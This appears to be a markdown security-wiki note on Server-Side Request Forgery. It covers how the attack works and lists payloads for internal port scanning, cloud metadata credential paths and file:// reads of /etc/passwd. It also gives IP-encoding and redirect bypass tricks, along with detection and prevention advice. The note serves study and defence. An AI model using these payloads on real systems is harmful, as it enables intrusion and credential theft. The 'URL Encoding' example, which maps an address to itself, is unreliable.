# Server Side Request Forgery (SSRF)

## Overview
Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

## How SSRF Works
1. **Attacker identifies input field** that accepts URLs or fetches remote resources
2. **Manipulates the input** to make server request internal/external resources
3. **Server processes the request** using its own privileges and network access
4. **Attacker gains access** to internal systems or sensitive data

## Types of SSRF

### Basic SSRF
```http
POST /api/fetch-url HTTP/1.1
Content-Type: application/json

{
    "url": "http://localhost:8080/admin"
}
```

### Blind SSRF
- No direct response from the target
- Detection through DNS logs, HTTP logs, or timing attacks
- Often used for reconnaissance

## Common Attack Vectors

### Internal Network Scanning
```bash
# Scan internal network
http://127.0.0.1:22
http://127.0.0.1:3306  
http://192.168.1.1:80
```

### Cloud Metadata Access
```bash
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure metadata  
http://169.254.169.254/metadata/instance?api-version=2017-08-01

# Google Cloud metadata
http://169.254.169.254/computeMetadata/v1/
```

### File System Access
```bash
# Local file reading
file:///etc/passwd
file:///proc/self/environ
file:///var/log/apache2/access.log
```

## Bypass Techniques

### URL Encoding
```bash
http://127.0.0.1 → http://127.0.0.1
http://localhost → http://127.0.0.1
```

### Alternative IP Representations
```bash
# Decimal format
http://2130706433/  # 127.0.0.1 in decimal

# Hexadecimal format  
http://0x7f000001/  # 127.0.0.1 in hex

# Octal format
http://0177.0.0.1/
```

### DNS Tricks
```bash
# Subdomain pointing to localhost
http://127.0.0.1.example.com/
http://localhost.example.com/
```

### URL Redirects
```bash
# Use redirector service
http://redirector.com/redirect?url=http://127.0.0.1:8080
```

## Impact
- **Internal network reconnaissance**
- **Access to internal services** and APIs
- **Cloud metadata exposure** (AWS credentials, etc.)
- **File system access** 
- **Port scanning** of internal systems
- **Denial of Service** attacks

## Detection
- Monitor outbound network requests from web servers
- Check for requests to internal IP ranges
- Log DNS queries for suspicious domains
- Analyze application logs for unusual URL patterns

## Prevention
1. **Input Validation**: Validate URLs against allowlists
2. **Network Segmentation**: Restrict server's network access
3. **Disable Unused Protocols**: Block file://, gopher://, etc.
4. **Response Filtering**: Don't return internal responses to users
5. **Firewall Rules**: Block access to internal IP ranges
6. **Authentication**: Require authentication for sensitive endpoints

## Testing Tools
- [[Burpsuite]] - Manual SSRF testing
- [[ffuf]] - SSRF fuzzing
- [[SSRFmap]] - Automated SSRF exploitation
- [[Collaborator]] - Blind SSRF detection

## Related Topics
- [[Web application security]]
- [[Cloud security]]
- [[Network reconnaissance]]
- [[Burpsuite]]
